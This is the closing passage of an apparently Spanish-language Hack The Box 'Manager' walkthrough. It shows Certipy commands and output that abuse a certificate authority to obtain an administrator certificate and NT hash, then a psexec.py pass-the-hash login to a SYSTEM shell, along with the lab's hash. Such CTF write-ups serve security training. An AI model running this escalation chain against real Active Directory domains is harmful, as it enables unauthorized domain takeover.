</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Certipy v4.8.2 - by Oliver Lyak (ly4k)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Successfully added officer &#39;Raven&#39; on &#39;manager-DC01-CA&#39;
</span></span></span><span class=line><span class=cl><span class=go>Certipy v4.8.2 - by Oliver Lyak (ly4k)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Successfully enabled &#39;SubCA&#39; on &#39;manager-DC01-CA&#39;
</span></span></span><span class=line><span class=cl><span class=go>Certipy v4.8.2 - by Oliver Lyak (ly4k)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Requesting certificate via RPC
</span></span></span><span class=line><span class=cl><span class=go>[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
</span></span></span><span class=line><span class=cl><span class=go>[*] Request ID is 14
</span></span></span><span class=line><span class=cl><span class=go>Would you like to save the private key? (y/N) y
</span></span></span><span class=line><span class=cl><span class=go>[*] Saved private key to 14.key
</span></span></span><span class=line><span class=cl><span class=go>[-] Failed to request certificate
</span></span></span><span class=line><span class=cl><span class=go>Certipy v4.8.2 - by Oliver Lyak (ly4k)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Successfully issued certificate
</span></span></span><span class=line><span class=cl><span class=go>Certipy v4.8.2 - by Oliver Lyak (ly4k)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Rerieving certificate with ID 13
</span></span></span><span class=line><span class=cl><span class=go>[*] Successfully retrieved certificate
</span></span></span><span class=line><span class=cl><span class=go>[*] Got certificate with UPN &#39;administrator@manager.htb&#39;
</span></span></span><span class=line><span class=cl><span class=go>[*] Certificate has no object SID
</span></span></span><span class=line><span class=cl><span class=go>[*] Loaded private key from &#39;13.key&#39;
</span></span></span><span class=line><span class=cl><span class=go>[*] Saved certificate and private key to &#39;administrator.pfx&#39;
</span></span></span></code></pre></div><ul><li>Finalmente, trato de usar este certificado para obtener el hash del usuario <code>administrator</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236
</span></span></span><span class=line><span class=cl><span class=go>Certipy v4.8.2 - by Oliver Lyak (ly4k)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Using principal: administrator@manager.htb
</span></span></span><span class=line><span class=cl><span class=go>[*] Trying to get TGT...
</span></span></span><span class=line><span class=cl><span class=go>[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
</span></span></span></code></pre></div><p>pero obtengo un error: <code>KRB_AP_ERR_SKEW(Clock skew too great)</code></p><div class="notice info"><div class=notice-title><i class="fa-solid fa-exclamation-circle" aria-hidden=true></i>Informaci√≥n</div><div class=notice-content><p>Si este error les ocurre, deber√≠an tratar de sincronizar el tiempo con el servicio <code>Kerberos</code> corriendo en nuestra m√°quina el comando:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>sudo ntpdate -u manager.htb
</span></span></span></code></pre></div></div></div><ul><li>Luego de sincronizar el tiempo, inmediatamente corro:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Certipy v4.8.2 - by Oliver Lyak (ly4k)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Using principal: administrator@manager.htb
</span></span></span><span class=line><span class=cl><span class=go>[*] Trying to get TGT...
</span></span></span><span class=line><span class=cl><span class=go>[*] Got TGT
</span></span></span><span class=line><span class=cl><span class=go>[*] Saved credential cache to &#39;administrator.ccache&#39;
</span></span></span><span class=line><span class=cl><span class=go>[*] Trying to retrieve NT hash for &#39;administrator&#39;
</span></span></span><span class=line><span class=cl><span class=go>[*] Got hash for &#39;administrator@manager.htb&#39;: aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
</span></span></span></code></pre></div><p>y esta vez s√≠ funciona.<div class="notice warning"><div class=notice-title><i class="fa-solid fa-exclamation-triangle" aria-hidden=true></i>Advertencia</div><div class=notice-content>Si esto vuelve a fallar, tienen que seguir actualizando/sincronizando el tiempo con <code>Kerberos</code> con el comando mostrado anteriormente hasta que funcione&mldr; Lo realmente importante aqu√≠ es ya haber obtenido el archivo <code>administrator.pfx</code></div></div></p><ul><li>Dado que obtuvimos un hash y, adem√°s, el servicio <code>SMB</code> est√° corriendo en la m√°quina podemos tratar de realizar un <code>Pass The Hash</code> usando <code>psexec.py</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rlwrap python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef administrator@manager.htb cmd.exe
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Impacket v0.11.0 - Copyright 2023 Fortra
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Requesting shares on manager.htb.....
</span></span></span><span class=line><span class=cl><span class=go>[*] Found writable share ADMIN$
</span></span></span><span class=line><span class=cl><span class=go>[*] Uploading file prIDvUQr.exe
</span></span></span><span class=line><span class=cl><span class=go>[*] Opening SVCManager on manager.htb.....
</span></span></span><span class=line><span class=cl><span class=go>[*] Creating service fldL on manager.htb.....
</span></span></span><span class=line><span class=cl><span class=go>[*] Starting service fldL.....
</span></span></span><span class=line><span class=cl><span class=go>[!] Press help for extra shell commands
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [Version 10.0.17763.4974]
</span></span></span><span class=line><span class=cl><span class=go>(c) 2018 Microsoft Corporation. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Windows\system32&gt; whoami
</span></span></span><span class=line><span class=cl><span class=go>nt authority\system
</span></span></span></code></pre></div><p>donde, finalmente, podemos obtener la flag en el Desktop del usuario <code>Administrator</code></p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Desarrollado por <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>